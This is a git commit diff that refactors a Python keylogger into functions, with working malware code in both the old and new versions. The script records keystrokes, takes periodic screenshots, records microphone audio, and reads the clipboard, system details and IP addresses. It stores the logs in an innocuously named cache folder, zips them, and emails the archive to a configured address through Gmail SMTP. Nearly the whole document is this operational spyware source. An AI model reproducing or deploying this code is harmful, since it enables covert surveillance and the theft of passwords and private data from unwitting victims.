f72eb3287473eba87801da7c1584f5cd75b36abe
Prajwal <prajwalslocker15@gmail.com>
2024-09-07 18:27:03 +0530

    Beautified the code

--- keylogger.py
+++ keylogger.py
@@ -1,93 +1,42 @@
 # Libraries
 
-from email.mime.multipart import MIMEMultipart
+import os
+import sys
+import time
+import socket
+import smtplib
+import getpass
+import platform
+import threading
+import clipboard
+import sounddevice as sd
+from requests import get
+from PIL import ImageGrab
+from email import encoders
+from zipfile import ZipFile
+from datetime import datetime
+from dotenv import load_dotenv
+from scipy.io.wavfile import write
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
-from email.mime.application import MIMEApplication
-from email import encoders
-import smtplib
-
-import socket
-import platform
-
-import clipboard # Using clipboard instead of win32clipboard
-
 from pynput.keyboard import Key, Listener
-
-import time
-import os
-import threading
-
-from scipy.io.wavfile import write
-import sounddevice as sd
-
-import getpass
-from requests import get
-
+from email.mime.multipart import MIMEMultipart
+from email.mime.application import MIMEApplication
 from multiprocessing import Process, freeze_support
-from PIL import ImageGrab
 
-from datetime import datetime
-
-import sys
-from zipfile import ZipFile
-
-from dotenv import load_dotenv
-
-load_dotenv()
-
-# Date and time formatter function
+# colon (:) is not allowed in filenames on Windows. Hence the formatter.
 
 def date_time_formatter(datetime_val):
-
-    # colon (:) is not allowed in filenames on Windows. Hence the formatter.
-
     return str(datetime_val)[0:10] + "_" +  str(datetime_val)[11:13] + "-" + str(datetime_val)[14:16] + "-" + str(datetime_val)[17:19]
-    
-# OS information fetch
-
-current_OS = platform.system()
-current_user = os.getlogin()
-logpath = ""
-
-# Directory creation for log files. MacOS currently not supported
-
-directory_name = "logconfig"
-
-if(current_OS == 'Linux'):
-    logpath = "/home/" + current_user + "/.cache/" + directory_name + "/"
-elif(current_OS == 'Windows'):
-    logpath = "C:\\temp\\" + current_user + "\\" + directory_name + "\\"
-    
-if not os.path.exists(logpath):
-    os.makedirs(logpath)
-
-# Variables
-
-system_information = "system.txt"
-audio_information = "audio.wav"
-clipboard_information = "clipboard.txt"
-keys_information = "key_log.txt"
-
-# Encrypted files
-
-# system_information_enc = 'enc_system.txt'
-# clipboard_information_enc = 'enc_clipboard.txt'
-# keys_information_enc = 'enc_keys_logged.txt'
-
-duration = 15
-stopping_time = 0
-current_date_time = datetime.now()
-file_prefix = date_time_formatter(current_date_time)
 
 def on_press_func(key):
-        try:
-            if time.time() > stopping_time:
-                listener.stop()
-            else:
-                key_f.write(key.char)
-        except AttributeError:
-            key_f.write('(' + str(key) + ')')
+    try:
+        if time.time() > all_info_var.get('stopping_time'):
+            listener.stop()
+        else:
+            key_f.write(key.char)
+    except AttributeError:
+        key_f.write('(' + str(key) + ')')
 
 def take_screenshot(flag_take_screenshot):
     iteration = 1
@@ -98,48 +47,114 @@ def take_screenshot(flag_take_screenshot):
         time.sleep(5)
         iteration += 1
 
-# System Information
+def fetch_n_make_logpath():
+    global logpath
+    if(current_OS == 'Linux'):
+        logpath = "/home/" + current_user + "/.cache/" + all_info_var.get('directory_name') + "/"
+    elif(current_OS == 'Windows'):
+        logpath = "C:\\" + all_info_var.get('directory_name') + "\\"
+    
+    if not os.path.exists(logpath):
+        os.makedirs(logpath)
+
+def fetch_n_write_sys_info():
+
+    sys_details.update({'architecture' : platform.architecture()})
+    sys_details.update({'system_info' : platform.system()})
+    sys_details.update({'uname' : platform.uname()})
+    sys_details.update({'hostname' : socket.gethostname()})
+    sys_details.update({'current_user' : current_user})
+
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
+    s.connect(("8.8.8.8", 80))
+
+    sys_details.update({'private_IP' : s.getsockname()[0] }) # returns the private IP of the machine
+    sys_details.update({'external_IP' : get('https://api.ipify.org').text})
+
+    sys_f = open(logpath + file_prefix + "_" + all_info_var.get('system_information'), 'a')
+
+    for item in sys_details.items():
+        sys_f.write(str(item) + '\n\n')
+
+    sys_f.write('Clipboard Contents: ' + '\n\t' + clipboard.paste() + '\n')
+
+    sys_f.close()
+
+def create_zip_file():
+    all_files = os.listdir(logpath)
+    global zipfile_name
+    global zipfile_full_path
+    zipfile_name = 'Zipped_logs_' + date_time_formatter(current_date_time) + '.zip'
+    zipfile_full_path = logpath + zipfile_name
+
+    with ZipFile(zipfile_full_path, 'w') as zipobj:
+        for file in all_files:
+            full_path = logpath + file
+            zipobj.write(full_path)
+
+def send_files_over_email():
+    subject = "LogFiles - " + str(sys_details.get('hostname')) + " " + str(sys_details.get('current_user')) + " - " + str(datetime.now())
+    body = "Loren Ipsum"
+    sender_email = os.getenv("SENDER_EMAIL")
+    recipient_email = os.getenv("RECEIVER_EMAIL")
+    sender_password = os.getenv("SENDER_EMAIL_PWD")
+    smtp_server = 'smtp.gmail.com'
+    smtp_port = 465
+
+    message = MIMEMultipart()
+    message['Subject'] = subject
+    message['From'] = sender_email
+    message['To'] = recipient_email
+    message.attach(MIMEText(body))
+
+    with open(zipfile_full_path,'rb') as file:
+        message.attach(MIMEApplication(file.read(), Name=zipfile_name))
+
+    with smtplib.SMTP_SSL(smtp_server, smtp_port) as server:
+        server.login(sender_email, sender_password)
+        server.sendmail(sender_email, recipient_email, message.as_string())
+
+load_dotenv()
+
+# Variables
 
 sys_details = {}
 
-sys_details.update({'architecture' : platform.architecture()})
-sys_details.update({'system_info' : platform.system()})
-sys_details.update({'uname' : platform.uname()})
-sys_details.update({'hostname' : socket.gethostname()})
-sys_details.update({'current_user' : current_user})
+all_info_var = {'system_information'    : "system.txt",
+                'audio_information'     : "audio.wav",
+                'keys_information'      : "key_log.txt",
+                'directory_name'        : "logconfig",
+                'capture_duration'      : 10,
+                'stopping_time'         : 0,
+                'sampling_freq'         : 44100}
 
-# sys_details[internal_IP] = socket.gethostbyname(hostname) # Usually returns loopback address
+# OS information fetch
 
-s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
-s.connect(("8.8.8.8", 80))
+current_OS = platform.system()
+current_user = os.getlogin()
+current_date_time = datetime.now()
+logpath = ""
 
-sys_details.update({'private_IP' : s.getsockname()[0] }) # Will return the private IP of the machine
-sys_details.update({'external_IP' : get('https://api.ipify.org').text})
+fetch_n_make_logpath()
 
-sys_f = open(logpath + file_prefix + "_" + system_information, 'a')
+file_prefix = date_time_formatter(current_date_time)
 
-for item in sys_details.items():
-    sys_f.write(str(item) + '\n\n')
+# System Information
 
-sys_f.write('Clipboard Contents: ' + '\n\t' + clipboard.paste() + '\n')
-
-sys_f.close()
+fetch_n_write_sys_info()
 
 # Keylogging, Microphone Capture and Screenshotting
 
 flag_take_screenshot = threading.Event()
 flag_take_screenshot.set()
-
 t = threading.Thread(target=take_screenshot, args=(flag_take_screenshot, )) # The comma is required. Otherwise Itereable Error is thrown
 t.start()
 
-sampling_freq = 44100
+myrecording = sd.rec(int(all_info_var.get('capture_duration') * all_info_var.get('sampling_freq')), samplerate=all_info_var.get('sampling_freq'), channels=2)
 
-myrecording = sd.rec(int(duration * sampling_freq), samplerate=sampling_freq, channels=2)
+key_f = open(logpath + file_prefix + "_" + all_info_var.get('keys_information'), 'a')
 
-key_f = open(logpath + file_prefix + "_" + keys_information, 'a')
-
-stopping_time = time.time() + duration
+all_info_var.update({'stopping_time' : time.time() + all_info_var.get('capture_duration')})
 
 with Listener(
         on_press=on_press_func) as listener:
@@ -147,45 +162,20 @@ with Listener(
 
 key_f.close()
 sd.wait()
+write(logpath + file_prefix + "_" + all_info_var.get('audio_information'), all_info_var.get('sampling_freq'), myrecording)
 
-write(logpath + file_prefix + "_" + audio_information, sampling_freq, myrecording)
-
+# Stop screenshots after mic and keyboard logging
 flag_take_screenshot.clear()
 
 # Creating zipfile of all log files
 
-all_files = os.listdir(logpath)
-zipfile_name = 'Zipped_logs_' + date_time_formatter(current_date_time) + '.zip'
-zipfile_full_path = logpath + zipfile_name
-
-with ZipFile(zipfile_full_path, 'w') as zipobj:
-    for file in all_files:
-        full_path = logpath + file
-        zipobj.write(full_path)
+zipfile_name = ""
+zipfile_full_path = ""
+create_zip_file()
 
 # Sending the zipfile over Email
 
-subject = "LogFiles - " + str(sys_details.get('hostname')) + " " + str(sys_details.get('current_user')) + " - " + str(datetime.now())
-body = "Loren Ipsum"
-sender_email = os.getenv("SENDER_EMAIL")
-recipient_email = os.getenv("RECEIVER_EMAIL")
-sender_password = os.getenv("SENDER_EMAIL_PWD")
-smtp_server = 'smtp.gmail.com'
-smtp_port = 465
-path_to_file = zipfile_full_path
-
-message = MIMEMultipart()
-message['Subject'] = subject
-message['From'] = sender_email
-message['To'] = recipient_email
-message.attach(MIMEText(body))
-
-with open(zipfile_full_path,'rb') as file:
-    message.attach(MIMEApplication(file.read(), Name=zipfile_name))
-
-with smtplib.SMTP_SSL(smtp_server, smtp_port) as server:
-   server.login(sender_email, sender_password)
-   server.sendmail(sender_email, recipient_email, message.as_string())
+send_files_over_email()
 
 #Code to delete all the files after the Zipfile is sent over mail
 
